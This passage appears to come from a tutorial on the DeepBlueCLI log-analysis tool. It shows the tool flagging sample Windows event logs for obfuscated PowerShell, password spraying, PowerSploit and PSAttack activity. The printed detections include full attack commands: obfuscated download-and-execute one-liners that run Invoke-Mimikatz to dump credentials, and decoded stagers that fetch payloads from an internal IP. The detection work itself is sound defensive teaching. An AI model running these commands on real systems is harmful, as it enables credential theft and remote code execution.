          YAYwAyAGMAMQAxADUANAAzADUAOAA1ADIAMQA4AGMANQA1AGEANAA4ADgAZgA0AGQAZgBhADYAYwBhAGIAOAA1AGUANgBlADMAMQBiAGMAYwA4AGEANAAxADMANgAxADEAYwBlADg
          AZQBjAGUAMwBkADEAYgA1AGQAMgBiADYANQA5AGUANgA5AGMAZAA1AGIANgBkADMAYwA4ADYANwAwADkAMwA4AGUAOABiADIANgA3AGIAZABkADEAYQA4ADMAOQBkAGQAOQAxADkA
          NwA5ADkAYQA4ADYAZQBlADIANQBkADYAMQA5ADEAMQA0ADUANwA3ADkAMgA3AGUAMwBkADEANQBlADgAZABlADcAZgAyADQAYgBhADAAYwA4ADgANABjADkAYgBiADUANQAxADQAO
          QBjADkAMgBhAGYAOQAwAGUAOQA4ADUANgA2ADcAZAA5ADQANAAzAGQANABiADIAOABlAGUANAA0AGIANAAxADEAOABlAGMAMQBlADIANgA0AGIAMQA2AGYAMwBlAGUAYQA1ADkAOA
          BmADgAMAA4ADEAZgAyADIAZQBmADQAMABlADgAMAAxADcAZABiAGEAOQAyAGIAYgBhAGUAMAA0ADIAZQA2ADcAZQA3ADQAMQA0ADYAMgA0ADQAZQBmADEAOQBlADkAYwAxAGEANwB
          jAGMAOQBjAGYAZgAyAGMAYgA0AGEAMAA3ADMANABkAGQAMwA0AGUAOAA4AGUANQAwADEAYgA2ADkAZgAyADgAYQA1AGQAOQA4AGQAMQAxADgAOAA4AGMAZQAwAGEAZQBmADMAZQAy
          AGYAMgA1ADgAZgA4ADcAMwA1ADkANQA4AGUAYwBjADQANwBiADcAYgA1ADAAYQA5AGMAZgAyADMAZAA3ADQANgA1ADEAZgAxAGQANAA5ADEAYQAwADcAYgBhAGMAMwA3ADcAYgBmA
          DgAMwA2ADYAYQBjAGUAZAA4ADIAZABmAGEAMwA0AGQAYwBjADkAZABlADYAYgAyADkAMABlAGUAYgAwADAAMgBjADIANgAwADMAMQA3AGMAMQBlADIAMQBlADQANAA1AGUAOAAzAD
          gAYQBkAGMANAA0AGYAMwBlADgAYgA5ADMAMwBlAGIANgAwAGEANgAyADAAZABlADkANgAxADMANgA4ADgAMAA4ADUAMgBiADEAYgAzAGYAMQAxADkAZgAyADMAMQAzADkAMAA0ADk
          ANQBlADMAOAA3AGYAMQA5AGUAZQAxADEAZgBlADMANQBjADEANAA2AGEAYQA3AGIANABiAGUAMQAwADUAMABhADQAZgAzAGQAZgBmADkAZQBmADYAYQBhADUAYwBmAGUANABhAGUA
          OABkAGYAMAA4AGYAMgA5AGQANAA2AGUANQA4ADcANgAzADgAYwBlADcAYwBkADEANwBhADAAMwAwAGEANQAxAGMAOQA1ADIAZgBmAGYANgA2ADYAZgA0ADAAOQA='|CONveRTTO-s
          ecUResTRING  -KEy  196,47,72,214,193,53,146,52,139,252,69,219,170,135,151,62,90,5,213,36,116,154,71,183) ) ))| .(
          $VErBosePRefERencE.toStrING()[1,3]+'x'-JOiN'')
Decoded :

Date    : 8/30/2017 1:14:51 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          Possible command obfuscation: 75% zeroes and ones (possible numeric or binary encoding)

Command : .( $vErBOSePreFErencE.TOSTRING()[1,3]+'X'-joIN'')(( '1001001}1000101r1011000C100000&101000&1001110C1100101r1110111C101101;1001111v1100010
          ;1101010r1100101v1100011j1110100v100000X1001110o1100101}1110100X101110}1010111;1100101r1100010v1000011X1101100v1101001j1100101v1101110j11
          10100}101001j101110}1000100j1101111g1110111g1101110}1101100g1101111g1100001;1100100;1010011}1110100;1110010g1101001X1101110&1100111X10100
          0v100111}1101000;1110100r1110100j1110000}1110011v111010j101111r101111}1110010o1100001X1110111r101110r1100111X1101001&1110100o1101000g1110
          101j1100010C1110101}1110011&1100101X1110010}1100011}1101111j1101110v1110100j1100101C1101110;1110100r101110&1100011r1101111;1101101&101111
          &1101101X1100001}1110100}1110100;1101001o1100110v1100101;1110011C1110100C1100001j1110100r1101001;1101111o1101110o101111j1010000&1101111X1
          110111}1100101j1110010j1010011&1110000;1101100r1101111r1101001;1110100o101111&1101101v1100001r1110011;1110100g1100101j1110010j101111r1000
          101v1111000r1100110j1101001X1101100C1110100r1110010;1100001o1110100C1101001;1101111X1101110j101111C1001001X1101110;1110110}1101111r110101
          1&1100101j101101&1001101r1101001v1101101;1101001o1101011o1100001&1110100o1111010v101110g1110000r1110011}110001g100111o101001v111011j10000
          0;1001001j1101110r1110110X1101111v1101011}1100101v101101;1001101r1101001&1101101;1101001C1101011v1100001&1110100j1111010}100000}101101}10
          00100C1110101v1101101r1110000v1000011j1110010r1100101v1100100;1110011' -splIT 'o'-splIt '&' -SPlIT 'r' -SplIt 'v' -sPLIT
          'g'-SPliT';'-spLIT'X'-sPlIt'}' -sPLIT 'C'-SPLIT'j'|FOReaCH-ObjEct {([CHaR]([ConvERT]::tOINT16(( [sTRinG]$_),2 ) )) })-JOIN '' )
Decoded :

Date    : 8/30/2017 1:14:33 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 52% alphanumeric and common symbols

Command : { ([cHar] ([coNVErT]::TOiNT16( ([String]$_ ),8) )) }
Decoded :

Date    : 8/30/2017 1:14:33 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 58% alphanumeric and common symbols

Command :  & ( $ENV:pUbLIc[13]+$EnV:pubLIc[5]+'X') ([STrIng]::JOin('' , ((111 ,105, 130 , 40,50,116 ,145 , 167, 55,117,142 , 152 ,145,143 ,164 ,
          40, 116,145,164,56, 127, 145 ,142, 103 ,154, 151 ,145 ,156 , 164,51, 56 , 104 ,157, 167 ,156 , 154 , 157 , 141 , 144, 123 ,164,162 ,151,
          156,147, 50 ,47 ,150 , 164,164,160 , 163 , 72,57, 57,162, 141,167 , 56,147 ,151, 164,150, 165, 142 ,165 , 163, 145, 162,143 ,157, 156
          ,164 ,145,156 , 164,56 ,143 ,157 ,155,57, 155 ,141, 164 , 164, 151 , 146,145 ,163, 164 , 141, 164 ,151, 157, 156 ,57 , 120 ,157,167 ,
          145,162 , 123,160 , 154, 157, 151, 164, 57,155 , 141, 163 ,164,145,162,57,105, 170 , 146,151, 154, 164 , 162 , 141,164,151,157,156 ,
          57,111,156 , 166 , 157, 153, 145,55, 115 ,151, 155 ,151, 153,141, 164 ,172,56, 160 , 163, 61 ,47 ,51,73 , 40,111,156 , 166, 157 ,153 ,
          145 ,55 ,115, 151 , 155 ,151 ,153 , 141, 164 ,172 ,40,55, 104,165 , 155, 160 ,103, 162 , 145 , 144 , 163 )| FOrEacH { ([cHar]
          ([coNVErT]::TOiNT16( ([String]$_ ),8) )) } )))
Decoded :

Date    : 8/30/2017 1:13:52 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 45% alphanumeric and common symbols

Command :  [sTRInG]::jOiN('' , (( 49 ,45 , 58,20,28 , '4e',65,77 , '2d' ,'4f' ,62 , '6a' , 65,63, 74 ,20 ,'4e', 65 ,74 ,'2e' ,57, 65 , 62,43
          ,'6c',69, 65 , '6e' , 74 ,29 ,'2e',44,'6f' , 77 ,'6e','6c' , '6f' ,61, 64 ,53 , 74,72 ,69 ,'6e',67, 28, 27 , 68 ,74, 74,70 ,73, '3a',
          '2f','2f', 72, 61, 77 , '2e',67,69, 74 ,68 , 75,62, 75, 73,65 ,72,63, '6f','6e',74 ,65, '6e', 74 ,'2e',63 ,'6f', '6d','2f' , '6d', 61
          ,74 ,74, 69,66 , 65, 73 ,74 ,61, 74 , 69 ,'6f' , '6e', '2f' ,50,'6f',77, 65,72,53 ,70, '6c' , '6f' ,69 ,74, '2f' , '6d' , 61 , 73 ,
          74,65,72 , '2f' ,45,78,66, 69, '6c', 74 , 72,61, 74,69,'6f' , '6e' , '2f' , 49,'6e' , 76, '6f','6b' ,65 , '2d' , '4d' ,69,'6d' , 69,
          '6b',61 , 74 , '7a' , '2e',70, 73 , 31 , 27, 29 ,'3b' ,20 ,49 ,'6e' , 76,'6f', '6b', 65, '2d', '4d',69, '6d' ,69,'6b' , 61 ,74, '7a' ,
          20 , '2d' ,44 , 75,'6d' , 70, 43, 72 ,65 ,64 , 73)|FoReaCh{ ([ChaR] ([Convert]::TOiNt16(($_.tOsTriNg()),16 )))}))|&(
          $enV:PuBlic[13]+$eNv:PUbliC[5]+'X')
Decoded :

Date    : 8/30/2017 1:13:38 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 56% alphanumeric and common symbols

Command :  & ( $eNv:COmSPEc[4,15,25]-JoIN'') ([ChAr[]] (73, 69 , 88 ,32 ,40,78 ,101 ,119 ,45, 79, 98,106 ,101,99 , 116 ,32 ,78,101, 116, 46,87,
          101 ,98 , 67 ,108 ,105,101 ,110, 116 ,41 , 46, 68, 111 ,119 , 110 , 108 , 111 ,97 ,100 , 83,116, 114,105 , 110, 103, 40 , 39, 104, 116 ,
          116,112 , 115,58,47,47 ,114, 97 ,119,46 , 103,105 , 116, 104,117, 98 ,117 , 115 , 101 ,114,99, 111 ,110 , 116,101 ,110 , 116, 46 , 99 ,
          111,109 ,47 ,109 ,97,116 , 116,105,102, 101 , 115 , 116,97 , 116 ,105 ,111 , 110,47,80,111 ,119 , 101,114,83, 112, 108,111, 105,116
          ,47,109, 97 , 115 , 116, 101 ,114,47 ,69 ,120, 102,105, 108,116 , 114, 97,116 , 105,111,110, 47 , 73,110 ,118 ,111 , 107 , 101,45 , 77,
          105 ,109 , 105, 107 , 97 , 116, 122 , 46 ,112 ,115, 49, 39 ,41 , 59 , 32,73 , 110 , 118 ,111 ,107 ,101,45,77,105 , 109 ,105, 107 ,97,
          116 ,122,32 ,45 , 68 ,117 ,109,112 , 67 ,114 , 101,100 , 115 )-join '')
Decoded :



PS C:\tools\DeepBlueCLI-master>
```

**Obfuscation (string)**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\Powershell-Invoke-Obfuscation-string-menu.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 8/30/2017 1:25:48 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 51% alphanumeric and common symbols
          Use of PowerSploit

Command :   & ( $psHOmE[21]+$PSHome[30]+'x') ( (('IE'+'X '+'(Ne'+'w-Obje'+'c'+'t Ne'+'t.We'+'bCli'+'ent'+').Dow'+'n'+'loadSt'+'ri'+'ng({0}https://r
          aw.'+'github'+'userc'+'o'+'nt'+'ent.'+'com/'+'ma'+'ttif'+'e'+'stati'+'on/'+'PowerSploit'+'/m'+'aster'+'/E'+'xfi'+'ltr'+'at'+'i'+'on/Invok
          e-M'+'im'+'ikatz'+'.ps1'+'{0});'+' '+'Invok'+'e-'+'M'+'imi'+'katz '+'-DumpCreds')  -f [cHaR]39))
Decoded :

Date    : 8/30/2017 1:25:48 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 53% alphanumeric and common symbols

Command : $l7i= " ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+'1sp.'+'ztaki'+'mi'+'M-ekovnI/no'+'i'+'ta'+'rtl'+'ifx'+'E
          /'+'retsa'+'m/'+'tiolpSrewoP'+'/no'+'itats'+'e'+'fitt'+'am'+'/moc'+'.tne'+'tn'+'o'+'cresu'+'buhtig'+'.war//:sptth}0{(gn'+'ir'+'tSdaol'+'n
          '+'woD.)'+'tne'+'ilCb'+'eW.t'+'eN t'+'c'+'ejbO-w'+'eN('+' X'+'EI'(( ( )'x'+]03[emoHSP$+]12[EmOHsp$ ( &  ";  ( cHiLDiTEm
          ("vAr"+"iaBlE"+":"+"l7I")).vaLuE[-1 ..-(( cHiLDiTEm  ("vAr"+"iaBlE"+":"+"l7I")).vaLuE.lengTh)]-JOIN''|& (
          ([StRiNg]$VERbOsePREferENCe)[1,3]+'X'-join'')
Decoded :

Date    : 8/30/2017 1:25:20 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 49% alphanumeric and common symbols

Command :  ((("{41}{32}{44}{45}{20}{36}{35}{21}{10}{40}{29}{42}{26}{28}{1}{19}{15}{11}{48}{49}{39}{30}{4}{18}{47}{31}{24}{23}{33}{43}{12}{13}{7}{8}
          {22}{46}{14}{27}{25}{5}{0}{34}{6}{16}{17}{38}{3}{9}{2}{37}" -f'1','ubuserco','Dump','tz ','festati','atz.ps','); In','s','t','-','p','m/'
          ,'/','ma','ion/I','co','vok','e-M','on','ntent.','load','t','er','l','p','e-Mimik','.','nvok','gith',':','ti','rS','
          (New-','o','{0}','t','String({0}h','Creds','imika','t','s','IEX','//raw','it','Object
          Net.WebCli','ent).Down','/Exfiltrat','/Powe','m','a')) -F  [ChaR]39) | . ( $ShelliD[1]+$sHELliD[13]+'X')
Decoded :

Date    : 8/30/2017 1:25:04 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 61% alphanumeric and common symbols

Command : (('IEX ('+'New'+'-Object'+' Net.Web'+'Client'+')'+'.DownloadString(oH'+'4http'+'s:'+'//raw'+'.g'+'it'+'hubuse'+'rcontent.c'+'om/m'+'at'+'
          tifes'+'t'+'a'+'tion/'+'Po'+'we'+'rSploit/ma'+'s'+'ter/Exfiltra'+'tion'+'/I'+'nvoke-Mimikat'+'z.ps1oH4'+'); Invoke-Mimi'+'katz
          -Du'+'mpCred'+'s') -REpLacE ([cHaR]111+[cHaR]72+[cHaR]52),[cHaR]39)| IEx
Decoded :


PS C:\tools\DeepBlueCLI-master>
```

**Password guessing**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\smb-password-guessing-security.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 9/19/2016 10:50:06 AM
Log     : Security
EventID : 4625
Message : High number of logon failures for one account
Results : Username: Administrator
          Total logon failures: 3560
Command :
Decoded :

Date    : 9/19/2016 10:50:06 AM
Log     : Security
EventID : 4625
Message : High number of total logon failures for multiple accounts
Results : Total accounts: 2
          Total logon failures: 3561

Command :
Decoded :

PS C:\tools\DeepBlueCLI-master>
```
**Password spraying**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\password-spray.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 4/30/2019 1:27:40 PM
Log     : Security
EventID : 4648
Message : Distributed Account Explicit Credential Use (Password Spray Attack)
Results : The use of multiple user account access attempts with explicit credentials is an indicator of a password spray attack.
          Target Usernames: gsalinas cdavis lpesce Administrator melliott dpendolino cragoso baker cmoody rbowes jkulikowski jleytevidal tbennett
          zmathis bgreenwood cspizor wstrzelec drook dmashburn sanson cfleener celgee bhostetler eskoudis kperryman mtoussain thessman bgalbraith
          ssims psmith jorchilles smisenar bking mdouglas jlake jwright econrad edygert lschifano sarmstrong ebooth
          Accessing Username: jwrig
          Accessing Host Name: DESKTOP-JR78RLP

Command :
Decoded :


PS C:\tools\DeepBlueCLI-master>
```

**PowerSploit (security)**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\powersploit-security.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 9/20/2016 1:19:26 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          500+ consecutive Base64 characters
          Base64 encoded and hidden PowerShell command
          Base64-encoded function
          Download via Net.WebClient DownloadString
          User-Agent set via command line

Command : powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUAdwAtAE8AQgBKAEUAQwBUACAAUwB5AFMAdABFAG0ALgBOAEUAVAAuAFcAZQBCAEMAbABJAGUATg
          B0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwA
          uADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAGEAZABFAHIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0
          ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AWABZACAAPQAgAFsAUwBZAFMAVABFAG0ALgBOAGUAdAAuAFcAZQBiAFIARQBxAHUAZQBzAHQAXQA6ADoARABFAGYAQQB1AGwAdABXA
          GUAYgBQAFIATwBYAHkAOwAkAHcAQwAuAFAAcgBvAFgAeQAuAEMAcgBlAGQARQBOAFQASQBBAEwAUwAgAD0AIABbAFMAWQBzAFQAZQBNAC4ATgBlAFQALgBDAFIAZQBEAGUAbgB0AG
          kAQQBMAEMAQQBjAGgAZQBdADoAOgBEAGUARgBBAFUAbAB0AE4AZQB0AHcAbwByAEsAQwBSAEUAZABlAG4AVABJAGEAbABTADsAJABLAD0AJwApADAAZABoAEMAeQAxAEoAOQBzADM
          AcQBZAEAAJQBMACEANwBwAHUAXQBUAHwAdgBWAH0AdABuAFsAQQBRAFIAJwA7ACQAaQA9ADAAOwBbAEMASABBAHIAWwBdAF0AJABCAD0AKABbAGMASABhAHIAWwBdAF0AKAAkAFcA
          YwAuAEQAbwB3AG4ATABvAGEARABTAHQAUgBpAG4ARwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA5ADgALgAxADQAOQA6ADgAMAA4ADIALwBpAG4AZABlAHgAL
          gBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAGIAWABPAHIAJABLAFsAJABJACsAKwAlACQASwAuAEwARQBuAEcAdABoAF0AfQA7AEkARQBYACAAKAAkAEIALQBqAG8AaQBOACcAJw
          ApAA==
Decoded : $Wc=New-OBJECT SyStEm.NET.WeBClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like
          Gecko';$WC.HeadErS.AdD('User-Agent',$u);$wc.ProXY = [SYSTEm.Net.WebREquest]::DEfAultWebPROXy;$wC.ProXy.CredENTIALS = [SYsTeM.NeT.CReDenti
          ALCAche]::DeFAUltNetworKCREdenTIalS;$K=')0dhCy1J9s3qY@%L!7pu]T|vV}tn[AQR';$i=0;[CHAr[]]$B=([cHar[]]($Wc.DownLoaDStRinG("http://192.168.19
          8.149:8082/index.asp")))|%{$_-bXOr$K[$I++%$K.LEnGth]};IEX ($B-joiN'')

Date    : 9/20/2016 1:15:54 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          500+ consecutive Base64 characters
          Base64 encoded and hidden PowerShell command
          Base64-encoded function
          Download via Net.WebClient DownloadString
          User-Agent set via command line

Command : powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AUwBFAHIAdgBJAEMAZQBQAG8AaQBOAFQATQBBAE4AYQBHAEUAcgBdADoAOg
          BFAFgAUABlAEMAVAAxADAAMABDAG8AbgBUAGkAbgB1AEUAIAA9ACAAMAA7ACQAVwBjAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAWQBTAHQAZQBNAC4ATgBFAFQALgBXAGUAQgB
          DAGwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABl
          AG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBBAEQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtA
          EEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAHgAeQAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBXAEUAQgBSAGUAcQB1AEUAUwB0AF0AOgA6AEQAZQBmAG
          EAdQBMAFQAVwBlAEIAUABSAG8AeAB5ADsAJABXAGMALgBQAFIATwB4AFkALgBDAFIARQBEAGUATgBUAEkAYQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUAbQAuAE4AZQB0AC4AQwByAGU
          ARABlAG4AdABJAEEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQBVAEwAVABOAGUAVAB3AG8AcgBrAEMAcgBFAEQAZQBuAFQASQBhAEwAcwA7ACQASwA9ACcAcwB5AHwAUgA0AFgA
          aABCAFcAbwB6AEsALgB4AC0ANgArADkAPgBJAGkAcQA3AEQAOABgAEoATABuAGwAdwBWACcAOwAkAEkAPQAwADsAWwBDAEgAYQBSAFsAXQBdACQAQgA9ACgAWwBDAGgAQQBSAFsAX
          QBdACgAJAB3AGMALgBEAE8AdwBuAGwAbwBhAEQAUwBUAHIASQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQA0ADkAOgA4ADAAOAAwAC8AaQ
          BuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgATwBSACQAawBbACQAaQArACsAJQAkAGsALgBMAGUAbgBnAHQAaABdAH0AOwBJAEUAWAAgACgAJABCAC0ASgB
          PAEkATgAnACcAKQA=
Decoded : [SYStEm.NET.SErvICePoiNTMANaGEr]::EXPeCT100ConTinuE = 0;$Wc=New-ObJecT SYSteM.NET.WeBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64;
          Trident/7.0; rv:11.0) like Gecko';$wc.HEADeRs.AdD('User-Agent',$u);$WC.PrOxy =
          [SysTem.NeT.WEBRequESt]::DefauLTWeBPRoxy;$Wc.PROxY.CREDeNTIaLs = [SYsTEm.Net.CreDentIAlCache]::DefaULTNeTworkCrEDenTIaLs;$K='sy|R4XhBWozK
          .x-6+9>Iiq7D8`JLnlwV';$I=0;[CHaR[]]$B=([ChAR[]]($wc.DOwnloaDSTrING("http://192.168.198.149:8080/index.asp")))|%{$_-BXOR$k[$i++%$k.Length]
          };IEX ($B-JOIN'')



PS C:\tools\DeepBlueCLI-master>
```

**PowerSploit (system)**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\powersploit-system.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R

Date    : 9/20/2016 12:45:48 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Download via Net.WebClient DownloadString
          Command referencing Mimikatz

Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('http://eic.me/17'); Invoke-Mimikatz -DumpCreds"
Decoded :

Date    : 9/20/2016 12:45:24 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Download via Net.WebClient DownloadString
          Command referencing Mimikatz
          PowerSploit Invoke-Mimikatz.ps1
          Use of PowerSploit

Command : powershell.exe  "IEX (New-Object
          Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
          Invoke-Mimikatz -DumpCreds"
Decoded :

PS C:\tools\DeepBlueCLI-master>
PS C:\tools\DeepBlueCLI-master>
```

**PSAttack**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\psattack-security.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 9/20/2016 12:41:27 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Resource File To COFF Object Conversion Utility cvtres.exe
          PSAttack-style command via cvtres.exe

Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86
          "/OUT:C:\Users\IEUser\AppData\Local\Temp\RES3874.tmp" "c:\Users\IEUser\AppData\Local\Temp\CSC14C61BA389694F5FAB6FBD8E9CFA7CEF.TMP"
Decoded :

Date    : 9/20/2016 12:41:27 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Use of C Sharp compiler csc.exe
          PSAttack-style command via csc.exe

Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\kwos13rh.cmdline"
Decoded :

Date    : 9/20/2016 12:33:13 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Resource File To COFF Object Conversion Utility cvtres.exe
          PSAttack-style command via cvtres.exe

Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86
          "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESB25D.tmp" "c:\Users\IEUser\AppData\Local\Temp\CSCAE981B6C775D478784A2D2A90379D51.TMP"
Decoded :

Date    : 9/20/2016 12:33:13 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Use of C Sharp compiler csc.exe
          PSAttack-style command via csc.exe

Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\0xqpayvt.cmdline"
Decoded :

Date    : 9/20/2016 12:28:58 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Resource File To COFF Object Conversion Utility cvtres.exe
          PSAttack-style command via cvtres.exe

Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86
          "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESCB96.tmp" "c:\Users\IEUser\AppData\Local\Temp\CSCDD7CF7985DD64D48B389AD7A587C926D.TMP"
Decoded :

Date    : 9/20/2016 12:28:58 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Use of C Sharp compiler csc.exe
          PSAttack-style command via csc.exe

Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\wlqywrdm.cmdline"
Decoded :

Date    : 9/20/2016 12:27:45 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Resource File To COFF Object Conversion Utility cvtres.exe
          PSAttack-style command via cvtres.exe

Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86
          "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESADB2.tmp" "c:\Users\IEUser\AppData\Local\Temp\CSC4EC78419D61349E285CD9DBCB3C7409.TMP"
Decoded :

Date    : 9/20/2016 12:27:44 PM
Log     : Security
EventID : 4688
Message : Suspicious Command Line
Results : Use of C Sharp compiler csc.exe
          PSAttack-style command via csc.exe

Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\g4g34pot.cmdline"
Decoded :



PS C:\tools\DeepBlueCLI-master>
```

**User added to administrator group**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\new-user-security.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 10/23/2013 10:22:40 AM
Log     : Security
EventID : 4732
Message : User added to local Administrators group
Results : Username: -
          User SID: S-1-5-21-3463664321-2923530833-3546627382-1000

Command :
Decoded :

Date    : 10/23/2013 10:22:39 AM
Log     : Security
EventID : 4720
Message : New User Created
Results : Username: IEUser
          User SID: S-1-5-21-3463664321-2923530833-3546627382-1000

Command :
Decoded :


PS C:\tools\DeepBlueCLI-master>
```

DeepBlueCLI also supports a variety of output methods. i.e JSON, HTML, CSV, etc as listed in the table below:

|Output Type|Syntax|
|-----------|------|
|CSV|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx \| ConvertTo-Csv`|
|Format list (default)|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx \| Format-List`|
|Format table|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx \| Format-Table`|
